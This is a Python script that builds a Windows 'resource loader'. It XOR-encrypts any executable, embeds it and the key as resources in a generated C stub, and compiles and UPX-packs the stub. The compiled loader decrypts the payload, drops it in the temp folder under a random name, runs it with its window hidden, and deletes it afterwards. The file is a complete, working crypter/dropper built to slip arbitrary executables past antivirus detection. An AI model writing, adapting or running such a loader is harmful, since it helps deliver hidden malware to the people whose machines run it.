import os
import sys
import subprocess
import random
import string
import shutil

def generate_random_name():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def build_single_exe_with_dll(exe_path):
    print("=" * 60)
    print("BINARY RESOURCE LOADER")
    print("=" * 60)
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        return None
    
    output_dir = os.path.dirname(exe_path)
    
    print("Reading source EXE...")
    with open(exe_path, 'rb') as f:
        exe_data = f.read()
    
    print(f"Source size: {len(exe_data) / (1024*1024):.1f} MB")
    
    if exe_data[0] != 0x4D or exe_data[1] != 0x5A:
        print("ERROR: Not a valid EXE!")
        return None
    print("EXE header OK (MZ)")
    
    print("Encrypting with XOR...")
    key = os.urandom(32)
    encrypted = bytearray()
    for i, byte in enumerate(exe_data):
        encrypted.append(byte ^ key[i % len(key)])
    
    # Сохраняем как бинарные файлы
    name1 = generate_random_name()
    name2 = generate_random_name()
    
    data_bin = os.path.join(output_dir, f'{name1}.bin')
    with open(data_bin, 'wb') as f:
        f.write(encrypted)
    
    key_bin = os.path.join(output_dir, f'{name2}.bin')
    with open(key_bin, 'wb') as f:
        f.write(key)
    
    print("Creating resource file...")
    
    rc_content = f'''
#include <windows.h>
IDR_1 RCDATA "{name1}.bin"
IDR_2 RCDATA "{name2}.bin"
'''
    
    rc_file = os.path.join(output_dir, 'resource.rc')
    with open(rc_file, 'w', encoding='utf-8') as f:
        f.write(rc_content)
    
    print("Creating loader...")
    
    loader_code = '''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")

#define IDR_1 101
#define IDR_2 102

void run_payload() {
    HMODULE h = GetModuleHandleA(NULL);
    
    // Получаем зашифрованные данные
    HRSRC r1 = FindResourceA(h, MAKEINTRESOURCE(IDR_1), "RCDATA");
    if (!r1) {
        MessageBoxA(NULL, "Resource IDR_1 not found!", "Error", MB_OK);
        return;
    }
    
    HGLOBAL g1 = LoadResource(h, r1);
    if (!g1) return;
    
    DWORD s1 = SizeofResource(h, r1);
    unsigned char* d1 = (unsigned char*)LockResource(g1);
    
    // Получаем ключ
    HRSRC r2 = FindResourceA(h, MAKEINTRESOURCE(IDR_2), "RCDATA");
    if (!r2) {
        MessageBoxA(NULL, "Resource IDR_2 not found!", "Error", MB_OK);
        return;
    }
    
    HGLOBAL g2 = LoadResource(h, r2);
    if (!g2) return;
    
    DWORD s2 = SizeofResource(h, r2);
    unsigned char* d2 = (unsigned char*)LockResource(g2);
    
    // Расшифровываем
    unsigned char* out = (unsigned char*)malloc(s1);
    if (!out) return;
    memcpy(out, d1, s1);
    
    for (DWORD i = 0; i < s1; i++) {
        out[i] ^= d2[i % s2];
    }
    
    // Проверка EXE
    if (out[0] != 0x4D || out[1] != 0x5A) {
        MessageBoxA(NULL, "Not a valid EXE!", "Error", MB_OK);
        free(out);
        return;
    }
    
    // Сохраняем во временный файл
    char tmp[MAX_PATH];
    char fn[13];
    GetTempPathA(MAX_PATH, tmp);
    const char* c = "abcdefghijklmnopqrstuvwxyz0123456789";
    for(int i = 0; i < 12; i++) {
        fn[i] = c[rand() % 36];
    }
    fn[12] = '\\0';
    strcat(tmp, fn);
    strcat(tmp, ".exe");
    
    HANDLE f = CreateFileA(tmp, GENERIC_WRITE, 0, NULL,
                          CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(f, out, s1, &w, NULL);
        CloseHandle(f);
        
        STARTUPINFOA si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        CreateProcessA(tmp, NULL, NULL, NULL, FALSE,
                      NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi);
        
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        Sleep(9000);
        DeleteFileA(tmp);
    }
    
    free(out);
}

int main() {
    run_payload();
    Sleep(15000);
    return 0;
}
'''
    
    loader_src = os.path.join(output_dir, 'loader.c')
    with open(loader_src, 'w', encoding='utf-8') as f:
        f.write(loader_code)
    
    print("Compiling with resources...")
    loader_exe = os.path.join(output_dir, f'loader_{generate_random_name()}.exe')
    
    res_obj = os.path.join(output_dir, 'resource.o')
    subprocess.run(['windres', '-i', rc_file, '-o', res_obj], capture_output=True)
    
    cmd = [
        'gcc',
        loader_src,
        res_obj,
        '-o', loader_exe,
        '-O3',
        '-s',
        '-static',
        '-Wl,--subsystem,windows',
        '-mwindows'
    ]
    
    try:
        result = subprocess.run(cmd, check=True, capture_output=True)
        print("Compilation OK")
    except subprocess.CalledProcessError as e:
        print(f"Compilation failed: {e.stderr.decode()}")
        return None
    
    print("Compressing with UPX...")
    try:
        subprocess.run(['upx', '--best', loader_exe], capture_output=True, check=True)
        print("UPX compression OK")
    except:
        print("UPX compression skipped or failed")
    
    final_size = os.path.getsize(loader_exe) / (1024 * 1024)
    
    print("=" * 60)
    print("DONE")
    print(f"Output: {loader_exe}")
    print(f"Size: {final_size:.2f} MB")
    print("=" * 60)
    
    # Cleanup
    try:
        os.remove(rc_file)
        os.remove(res_obj)
        os.remove(data_bin)
        os.remove(key_bin)
        os.remove(loader_src)
    except:
        pass
    
    return loader_exe

if __name__ == "__main__":
    exe_path = "dist/temp.exe"
    
    if len(sys.argv) > 1:
        exe_path = sys.argv[1]
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        sys.exit(1)
    
    build_single_exe_with_dll(exe_path)
